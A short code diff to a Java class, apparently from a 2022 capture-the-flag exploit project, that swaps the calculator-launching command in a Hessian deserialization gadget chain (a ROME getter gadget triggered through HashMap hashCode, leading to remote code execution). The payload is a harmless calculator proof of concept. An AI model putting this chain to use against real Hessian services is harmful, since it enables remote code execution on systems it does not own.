@@ -20,7 +20,7 @@ public class HFCTF2022Hessian {
     }
 
     public static void case2() throws Exception{
-        Object sink = GServerManagerImpl.getter2RCE("open -a Calculator");
+        Object sink = GServerManagerImpl.getter2RCE("mate-calc");
         Object gadget = GRome.toString2Getter(sink);
         Object exp = GHashMap.deserialize2HashCode(gadget,gadget);
         SerializeUtils.hessian2Deserialize(SerializeUtils.hessian2Serialize(exp));
